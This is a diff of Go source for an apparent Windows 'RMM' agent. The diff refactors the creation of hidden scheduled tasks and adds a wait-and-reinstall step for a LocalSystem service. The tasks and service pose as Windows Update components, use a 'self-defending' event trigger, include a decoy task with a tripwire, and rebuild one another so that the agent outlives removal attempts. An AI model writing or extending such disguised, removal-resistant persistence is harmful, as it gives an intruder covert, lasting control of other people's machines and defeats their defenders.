@@ -351,14 +351,7 @@ func install() {
 	}
 	_, _ = hiddenExec("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()
 
-	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
-  <Triggers><LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT10M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principals>
-  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure></Settings>
-  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
-</Task>`, agentPath, controllerAddr, certPath)
+	taskXML := agentTaskXML(agentPath, controllerAddr, certPath)
 
 	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
 	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
@@ -736,42 +729,15 @@ func createWatchdogTask(agentPath, backupDir string) {
 	// Native supervisor task: runs the agent binary with --watch (no
 	// powershell anywhere). XML copy stays beside the backup so the
 	// watcher itself can rebuild a deleted task.
-	watchdogTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
-    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
-</Task>`, agentPath)
-
-	// Self-defending task: any task-table mutation re-fires it instantly.
-	watchdogTaskXML = withEventTrigger(watchdogTaskXML)
+	// Self-defending task: any task-table mutation re-fires it instantly
+	// (event trigger applied inside the builder).
+	wxml := watchdogTaskXML(agentPath)
 
 	// Keep a copy beside the backup so the watcher can rebuild a deleted
 	// task without the installer.
-	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
+	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(wxml), 0644)
 	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
-	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
+	_ = os.WriteFile(tmpWatchdogTask, []byte(wxml), 0644)
 	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
@@ -785,35 +751,7 @@ func createWatchdogTask(agentPath, backupDir string) {
 // different name (logon + 30min + unlock, runs --watch). A kill chain that
 // wipes "WindowsUpdate*" by name still leaves this one to revive the rest.
 func createOrchestratorTask(agentPath, backupDir, installDir string) {
-	orchXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT30M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
-    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
-</Task>`, agentPath)
-
-	orchXML = withEventTrigger(orchXML)
+	orchXML := orchestratorTaskXML(agentPath)
 	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
@@ -833,33 +771,7 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 // exits) on logon and hourly. Deleting it trips the tripwire instead of
 // hurting anything.
 func createDecoyTask(agentPath, backupDir, installDir string) {
-	decoyXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT1H</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--wmi-heal</Arguments></Exec></Actions>
-</Task>`, agentPath)
-
-	decoyXML = withEventTrigger(decoyXML)
+	decoyXML := decoyTaskXML(agentPath)
 	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
@@ -963,7 +875,19 @@ const repairSvcName = "WindowsUpdateOrchestrator"
 // session. Idempotent: existing service is stopped + removed first.
 func installRepairService(agentPath string) {
 	bin := `"` + agentPath + `" --svc-heal`
-	_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
+	// Stop first and WAIT for STOPPED: deleting a still-running service
+	// makes SCM log 7031 "terminated unexpectedly" + fire the 60s restart
+	// action (the alarming error loop seen on every reinstall).
+	if _, err := hiddenExec("sc", "stop", repairSvcName).CombinedOutput(); err == nil {
+		for i := 0; i < 30; i++ {
+			out, _ := hiddenExec("sc", "query", repairSvcName).CombinedOutput()
+			s := strings.ToUpper(string(out))
+			if strings.Contains(s, "STOPPED") || strings.Contains(s, "FAILED 1060") || strings.Contains(s, "DOES NOT EXIST") {
+				break
+			}
+			time.Sleep(time.Second)
+		}
+	}
 	_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
 	time.Sleep(time.Second)
 	out, err := hiddenExec("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
